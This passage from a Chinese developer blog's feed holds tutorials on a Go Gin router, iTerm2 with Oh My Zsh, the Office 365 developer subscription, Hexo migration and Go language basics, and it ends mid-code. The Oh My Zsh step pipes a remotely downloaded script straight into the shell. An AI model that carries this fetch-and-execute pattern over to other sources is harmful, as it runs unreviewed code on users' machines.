class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> routers</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"gin-blog/pkg/setting"</span></span><br><span class="line"><span class="string">"github.com/gin-gonic/gin"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">InitRouter</span><span class="params">()</span> *<span class="title">gin</span>.<span class="title">Engine</span></span> &#123;</span><br><span class="line">r := gin.New()</span><br><span class="line">r.Use(gin.Logger())</span><br><span class="line">r.Use(gin.Recovery())</span><br><span class="line"></span><br><span class="line">gin.SetMode(setting.RunModel)</span><br><span class="line"></span><br><span class="line">r.GET(<span class="string">"/test"</span>,<span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span>&#123;</span><br><span class="line">c.JSON(<span class="number">200</span>,gin.H&#123;</span><br><span class="line"><span class="string">"message"</span>:<span class="string">"ok"</span>,</span><br><span class="line">&#125;)</span><br><span class="line">&#125;)</span><br><span class="line">  <span class="keyword">return</span> r</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h4 id="修改main-go"><a href="#修改main-go" class="headerlink" title="修改main.go"></a>修改main.go</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"gin-blog/pkg/setting"</span></span><br><span class="line"><span class="string">"net/http"</span></span><br><span class="line"><span class="string">"gin-blog/routers"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// "github.com/gin-gonic/gin"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">router := routers.InitRouter()</span><br><span class="line"><span class="comment">// router := gin.Default()</span></span><br><span class="line"><span class="comment">// router.GET("/test", func(c *gin.Context) &#123;</span></span><br><span class="line"><span class="comment">// c.JSON(200, gin.H&#123;</span></span><br><span class="line"><span class="comment">// "message": "test",</span></span><br><span class="line"><span class="comment">// &#125;)</span></span><br><span class="line"><span class="comment">// &#125;)</span></span><br><span class="line">s := &amp;http.Server&#123;</span><br><span class="line">Addr:           fmt.Sprintf(<span class="string">":%d"</span>, setting.Httpport),</span><br><span class="line">Handler:        router,</span><br><span class="line">ReadTimeout:    setting.ReadTimeOut,</span><br><span class="line">WriteTimeout:   setting.WriteTimeOut,</span><br><span class="line">MaxHeaderBytes: <span class="number">1</span> &lt;&lt; <span class="number">20</span>,</span><br><span class="line">&#125;</span><br><span class="line">s.ListenAndServe()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">go</span> run main.<span class="keyword">go</span></span><br><span class="line">curl <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8000</span>/test</span><br><span class="line">&#123;<span class="string">"message"</span>:<span class="string">"ok"</span>&#125;</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
            <tag> golang </tag>
            
            <tag> gin </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iTerm2耍一耍</title>
      <link href="/2018/10/24/iterm2-shua-yi-shua/"/>
      <url>/2018/10/24/iterm2-shua-yi-shua/</url>
      
        <content type="html"><![CDATA[<h1 id="iTerm2耍一耍"><a href="#iTerm2耍一耍" class="headerlink" title="iTerm2耍一耍"></a>iTerm2耍一耍</h1><h2 id="安装iTerm2"><a href="#安装iTerm2" class="headerlink" title="安装iTerm2"></a>安装<a href="https://www.iterm2.com/" target="_blank" rel="noopener">iTerm2</a></h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew cask install iterm2</span><br></pre></td></tr></table></figure></div><h2 id="配置iTerm2主题"><a href="#配置iTerm2主题" class="headerlink" title="配置iTerm2主题"></a>配置iTerm2主题</h2><h3 id="最常用的主题就属于它了Solarized-Dark-theme果断下载。"><a href="#最常用的主题就属于它了Solarized-Dark-theme果断下载。" class="headerlink" title="最常用的主题就属于它了Solarized Dark theme果断下载。"></a>最常用的主题就属于它了<a href="https://ethanschoonover.com/solarized/" target="_blank" rel="noopener">Solarized Dark theme</a>果断下载。</h3><h4 id="打开iTerm2-到达preferences"><a href="#打开iTerm2-到达preferences" class="headerlink" title="打开iTerm2,到达preferences"></a>打开iTerm2,到达preferences</h4><p><img src="/.io//color.png" alt="color">  </p><h2 id="配置Oh-My-ZSH"><a href="#配置Oh-My-ZSH" class="headerlink" title="配置Oh My ZSH"></a>配置<a href="https://ohmyz.sh/" target="_blank" rel="noopener">Oh My ZSH</a></h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -c <span class="string">"<span class="variable">$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)</span>"</span></span><br></pre></td></tr></table></figure></div><p><img src="/.io//zsh.png" alt="zsh">)  </p><h4 id="出现这个说明安装成功。然后修改-zshrc，修改主题为ys"><a href="#出现这个说明安装成功。然后修改-zshrc，修改主题为ys" class="headerlink" title="出现这个说明安装成功。然后修改.zshrc，修改主题为ys"></a>出现这个说明安装成功。然后修改.zshrc，修改主题为ys</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZSH_THEME=&quot;ys&quot;</span><br></pre></td></tr></table></figure></div><h4 id="重新打开窗口。"><a href="#重新打开窗口。" class="headerlink" title="重新打开窗口。"></a>重新打开窗口。</h4><p><img src="/.io//ys.png" alt="ys"></p><h4 id="或者你可以修改为agnoster。"><a href="#或者你可以修改为agnoster。" class="headerlink" title="或者你可以修改为agnoster。"></a>或者你可以修改为agnoster。</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZSH_THEME=&quot;agnoster&quot;</span><br></pre></td></tr></table></figure></div><ul><li><h4 id="下载字体Meslo"><a href="#下载字体Meslo" class="headerlink" title="下载字体Meslo"></a>下载字体<a href="https://github.com/powerline/fonts/blob/master/Meslo%20Slashed/Meslo%20LG%20M%20Regular%20for%20Powerline.ttf" target="_blank" rel="noopener">Meslo</a></h4></li><li><h4 id="安装上字体。"><a href="#安装上字体。" class="headerlink" title="安装上字体。"></a>安装上字体。</h4><img src="/.io//font.png" alt="font"><br><img src="/.io//agnoster.png" alt="agnoster"></li></ul><h3 id="有人说需要自己安装才能自动提示，我安装完tab自动补全，自动提示都有了。没有的自行百度。风格就看自己喜欢什么的的来选吧。"><a href="#有人说需要自己安装才能自动提示，我安装完tab自动补全，自动提示都有了。没有的自行百度。风格就看自己喜欢什么的的来选吧。" class="headerlink" title="有人说需要自己安装才能自动提示，我安装完tab自动补全，自动提示都有了。没有的自行百度。风格就看自己喜欢什么的的来选吧。"></a>有人说需要自己安装才能自动提示，我安装完tab自动补全，自动提示都有了。没有的自行百度。风格就看自己喜欢什么的的来选吧。</h3>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> iTerm2 </tag>
            
            <tag> mac </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>教你如何获得免费的Office 365账户</title>
      <link href="/2018/10/17/jiao-ni-ru-he-huo-de-mian-fei-de-office-365-zhang-hu/"/>
      <url>/2018/10/17/jiao-ni-ru-he-huo-de-mian-fei-de-office-365-zhang-hu/</url>
      
        <content type="html"><![CDATA[<h1 id="教你如何获得免费的Office-365账户"><a href="#教你如何获得免费的Office-365账户" class="headerlink" title="教你如何获得免费的Office 365账户"></a>教你如何获得免费的Office 365账户</h1><blockquote><p>申明，这是微软 Office 365 面向开发者提供的免费订阅，是不能应用于企业、个人的商业使用的，理论上只能用于开发测试使用，请大家合理使用。</p></blockquote><h2 id="1-前期准备"><a href="#1-前期准备" class="headerlink" title="1.前期准备"></a>1.前期准备</h2><ul><li>微软帐号</li><li>可以接收短信的手机/号码<h2 id="2-申请帐号"><a href="#2-申请帐号" class="headerlink" title="2.申请帐号"></a>2.申请帐号</h2>链接：<a href="https://developer.microsoft.com/zh-cn/office/dev-program" target="_blank" rel="noopener">主页 - 开发人员计划</a><br>![join](教你如何获得免费的Office 365账户/join.png)  </li></ul><h3 id="登录自己的微软帐号。"><a href="#登录自己的微软帐号。" class="headerlink" title="登录自己的微软帐号。"></a>登录自己的微软帐号。</h3><p>![login](教你如何获得免费的Office 365账户/login.png)</p><h3 id="登录成功填写表单"><a href="#登录成功填写表单" class="headerlink" title="登录成功填写表单"></a>登录成功填写表单</h3><p>![form](教你如何获得免费的Office 365账户/form.png)<br>![form1](教你如何获得免费的Office 365账户/form1.png)  </p><h3 id="记得选择订阅哦！！！"><a href="#记得选择订阅哦！！！" class="headerlink" title="记得选择订阅哦！！！"></a>记得选择订阅哦！！！</h3><h2 id="3-订阅设置"><a href="#3-订阅设置" class="headerlink" title="3.订阅设置"></a>3.订阅设置</h2><h3 id="注册以获取为期-12-个月的免费-Office-365-开发人员订阅。"><a href="#注册以获取为期-12-个月的免费-Office-365-开发人员订阅。" class="headerlink" title="注册以获取为期 12 个月的免费 Office 365 开发人员订阅。"></a>注册以获取为期 12 个月的免费 Office 365 开发人员订阅。</h3><p>![setting](教你如何获得免费的Office 365账户/setting.png)<br>![setting1](教你如何获得免费的Office 365账户/setting1.png)<br>![setting2](教你如何获得免费的Office 365账户/setting2.png)</p><h3 id="如何你们点击没有反应，说明你需要一个可以访问外网的机器。"><a href="#如何你们点击没有反应，说明你需要一个可以访问外网的机器。" class="headerlink" title="如何你们点击没有反应，说明你需要一个可以访问外网的机器。"></a>如何你们点击没有反应，说明你需要一个可以访问外网的机器。</h3><h3 id="提交完成你将获得这样的提示。"><a href="#提交完成你将获得这样的提示。" class="headerlink" title="提交完成你将获得这样的提示。"></a>提交完成你将获得这样的提示。</h3><p>![success](教你如何获得免费的Office 365账户/success.png)</p><h2 id="4-设置office-365"><a href="#4-设置office-365" class="headerlink" title="4.设置office 365"></a>4.设置office 365</h2><h3 id="链接：Office-365-登录-Microsoft-Office"><a href="#链接：Office-365-登录-Microsoft-Office" class="headerlink" title="链接：Office 365 登录 | Microsoft Office"></a>链接：<a href="https://www.office.com/" target="_blank" rel="noopener">Office 365 登录 | Microsoft Office</a></h3><h3 id="注意：登录的账号不是微软帐号。应该是xxx-xxx-onmicrosoft-com"><a href="#注意：登录的账号不是微软帐号。应该是xxx-xxx-onmicrosoft-com" class="headerlink" title="注意：登录的账号不是微软帐号。应该是xxx@xxx.onmicrosoft.com"></a>注意：登录的账号不是微软帐号。应该是<a href="mailto:xxx@xxx.onmicrosoft.com" target="_blank" rel="noopener">xxx@xxx.onmicrosoft.com</a></h3><h3 id="这个一定需要注意，不然你是无法用个人帐号登录的。"><a href="#这个一定需要注意，不然你是无法用个人帐号登录的。" class="headerlink" title="这个一定需要注意，不然你是无法用个人帐号登录的。"></a>这个一定需要注意，不然你是无法用个人帐号登录的。</h3><h3 id="我们需要分配产品。"><a href="#我们需要分配产品。" class="headerlink" title="我们需要分配产品。"></a>我们需要分配产品。</h3><p>![office](教你如何获得免费的Office 365账户/office.png)<br>![office1](教你如何获得免费的Office 365账户/office1.png)</p><h3 id="选择你登录的账户。不是微软帐号。"><a href="#选择你登录的账户。不是微软帐号。" class="headerlink" title="选择你登录的账户。不是微软帐号。"></a>选择你登录的账户。不是微软帐号。</h3><p>![office2](教你如何获得免费的Office 365账户/office2.png)</p><h3 id="安装箭头一步一步执行。"><a href="#安装箭头一步一步执行。" class="headerlink" title="安装箭头一步一步执行。"></a>安装箭头一步一步执行。</h3><p>![office3](教你如何获得免费的Office 365账户/office3.png)  </p><h3 id="记得往下划，保存在最下方。"><a href="#记得往下划，保存在最下方。" class="headerlink" title="记得往下划，保存在最下方。"></a>记得往下划，保存在最下方。</h3><h3 id="重新登录，将可以看到自己可用的账户。"><a href="#重新登录，将可以看到自己可用的账户。" class="headerlink" title="重新登录，将可以看到自己可用的账户。"></a>重新登录，将可以看到自己可用的账户。</h3><p>![office4](教你如何获得免费的Office 365账户/office4.png)  </p><h3 id="你也可以利用win10来验证。"><a href="#你也可以利用win10来验证。" class="headerlink" title="你也可以利用win10来验证。"></a>你也可以利用win10来验证。</h3><p>![office5](教你如何获得免费的Office 365账户/office5.png)  </p><h2 id="5-配置OneDrive"><a href="#5-配置OneDrive" class="headerlink" title="5.配置OneDrive"></a>5.配置OneDrive</h2><h3 id="链接：OneDrive"><a href="#链接：OneDrive" class="headerlink" title="链接：OneDrive"></a>链接：<a href="https://admin.onedrive.com" target="_blank" rel="noopener">OneDrive</a></h3><h3 id="OneDrive默认为1024GB（1T），用此帐号可以修改为5120GB（5T）。"><a href="#OneDrive默认为1024GB（1T），用此帐号可以修改为5120GB（5T）。" class="headerlink" title="OneDrive默认为1024GB（1T），用此帐号可以修改为5120GB（5T）。"></a>OneDrive默认为1024GB（1T），用此帐号可以修改为5120GB（5T）。</h3><p>![office6](教你如何获得免费的Office 365账户/office6.png)</p><h3 id="你可以理解为就是云盘，云盘当然是越大越好，这样才能存下更多东西。"><a href="#你可以理解为就是云盘，云盘当然是越大越好，这样才能存下更多东西。" class="headerlink" title="你可以理解为就是云盘，云盘当然是越大越好，这样才能存下更多东西。"></a>你可以理解为就是云盘，云盘当然是越大越好，这样才能存下更多东西。</h3>]]></content>
      
      
      <categories>
          
          <category> 福利 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> office </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>电脑换了该如何继续写博客</title>
      <link href="/2018/10/10/dian-nao-huan-liao-gai-ru-he-ji-xu-xie-bo-ke/"/>
      <url>/2018/10/10/dian-nao-huan-liao-gai-ru-he-ji-xu-xie-bo-ke/</url>
      
        <content type="html"><![CDATA[<h1 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h1><p>按照以下步骤将可以实现在其他电脑继续写博客</p><h2 id="1-必要软件"><a href="#1-必要软件" class="headerlink" title="1.必要软件"></a>1.必要软件</h2><ul><li>GIT客户端</li><li>node.js  </li></ul><h2 id="2-在GitHub添加新电脑秘钥"><a href="#2-在GitHub添加新电脑秘钥" class="headerlink" title="2.在GitHub添加新电脑秘钥"></a>2.在GitHub添加新电脑秘钥</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">"kalifun@163.com"</span></span><br><span class="line">将id_rsa.pub复制到GitHub上</span><br><span class="line">ssh -T git@github.com</span><br><span class="line">Hi kalifun! You<span class="string">'ve successfully authenticated, but GitHub does not provide shell access.</span></span><br><span class="line"><span class="string">出现这个字样说明已经连接成功。</span></span><br></pre></td></tr></table></figure></div><h2 id="3-拷贝源文件"><a href="#3-拷贝源文件" class="headerlink" title="3.拷贝源文件"></a>3.拷贝源文件</h2><p><img src="/.io//source.png" alt="source"></p><ul><li>_config.yml</li><li>package.json</li><li>scaffolds/</li><li>source/</li><li>themes/</li></ul><h2 id="4-安装hexo"><a href="#4-安装hexo" class="headerlink" title="4.安装hexo"></a>4.安装hexo</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br></pre></td></tr></table></figure></div><h2 id="5-安装相关模块"><a href="#5-安装相关模块" class="headerlink" title="5.安装相关模块"></a>5.安装相关模块</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install</span><br><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure></div><h2 id="6-测试"><a href="#6-测试" class="headerlink" title="6.测试"></a>6.测试</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo s</span><br><span class="line">访问127.0.0.1:4000和你之前博客一样说明成功了。</span><br></pre></td></tr></table></figure></div><h2 id="7-指令"><a href="#7-指令" class="headerlink" title="7.指令"></a>7.指令</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> 站点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GoLang_Day4</title>
      <link href="/2018/09/16/golang-day4/"/>
      <url>/2018/09/16/golang-day4/</url>
      
        <content type="html"><![CDATA[<h1 id="GoLang-Day4"><a href="#GoLang-Day4" class="headerlink" title="GoLang_Day4"></a>GoLang_Day4</h1><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Go 语言中同时有函数和方法。</span><br><span class="line">一个方法就是一个包含了接受者的函数，</span><br><span class="line">接受者可以是命名类型或者结构体类型的一个值或者是一个指针。</span><br><span class="line">所有给定类型的方法属于该类型的方法集。</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"math"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line">fun := <span class="function"><span class="keyword">func</span><span class="params">(x,y <span class="keyword">float64</span>)</span> <span class="title">float64</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> math.Sqrt(x*x+y*y)    <span class="comment">//25的平方根</span></span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(fun(<span class="number">3</span>,<span class="number">4</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">D:\go_sty\day4&gt;go run function.go</span><br><span class="line">5</span><br></pre></td></tr></table></figure></div><h2 id="函数闭包"><a href="#函数闭包" class="headerlink" title="函数闭包"></a>函数闭包</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Go 函数可以是闭包的。闭包是一个函数值，它来自函数体的外部的变量引用。 函数可以对这个引用值进行访问和赋值；换句话说这个函数被“绑定”在这个变量上。</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">adder</span><span class="params">()</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">sum := <span class="number">0</span></span><br><span class="line"><span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(x <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">sum += x</span><br><span class="line"><span class="keyword">return</span> sum</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line">pos,neg := adder(),adder()</span><br><span class="line"><span class="keyword">for</span> i :=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++&#123;</span><br><span class="line">fmt.Println(</span><br><span class="line">pos(i),</span><br><span class="line">neg(<span class="number">-2</span>*i),</span><br><span class="line">)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">D:\go_sty\day4&gt;go run function_closer.go</span><br><span class="line">0 0</span><br><span class="line">1 -2</span><br><span class="line">3 -6</span><br><span class="line">6 -12</span><br><span class="line">10 -20</span><br><span class="line">15 -30</span><br><span class="line">21 -42</span><br><span class="line">28 -56</span><br><span class="line">36 -72</span><br><span class="line">45 -90</span><br></pre></td></tr></table></figure></div><h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;&lt;   左移n位就是乘以2的n次方     1 &lt;&lt;  10     ,结果为2的10次方：1024</span><br><span class="line">&gt;&gt;   右移n位就是除以2的n次方      1024 &gt;&gt; 10     结果为 1024/2的10次方=1</span><br><span class="line">^    异或   两个数个对应的二进制异或     124 ^ 2      1111100 ^ 0000010 = 1111110 结果为126</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
            <tag> golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GoLang_Day5</title>
      <link href="/2018/09/16/golang-day5/"/>
      <url>/2018/09/16/golang-day5/</url>
      
        <content type="html"><![CDATA[<h1 id="GoLang-Day5"><a href="#GoLang-Day5" class="headerlink" title="GoLang_Day5"></a>GoLang_Day5</h1><h2 id="1-字符串类型"><a href="#1-字符串类型" class="headerlink" title="1.字符串类型"></a>1.字符串类型</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">字符串表示很简单，就是由双引号（“ ”），“单”引号（` `）来描述。注意（` `）非（&apos; &apos;）</span><br><span class="line">唯一区别在于，双引号转义字符可以转义，单引号无法转义。</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line"><span class="keyword">var</span> a = <span class="string">"hello \n world"</span></span><br><span class="line"><span class="keyword">var</span> b = <span class="string">`hello \n world`</span></span><br><span class="line">fmt.Println(a)</span><br><span class="line">fmt.Println(<span class="string">"-------"</span>)</span><br><span class="line">fmt.Println(b)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">D:\go_sty\day5&gt;go run string.go</span><br><span class="line">hello</span><br><span class="line"> world</span><br><span class="line">-------</span><br><span class="line">hello \n world</span><br></pre></td></tr></table></figure></div><h2 id="panic-amp-amp-recover"><a href="#panic-amp-amp-recover" class="headerlink" title="panic &amp;&amp; recover"></a>panic &amp;&amp; recover</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">panic &amp;&amp; recover是GO语言用来处理异常的关键词</span><br><span class="line">panic用来触发异常的，而recover是用来停止异常并返回传递给panic的值。</span><br><span class="line">注：recover不能异常处理，而recover只能在defer里面，否则无效。</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span 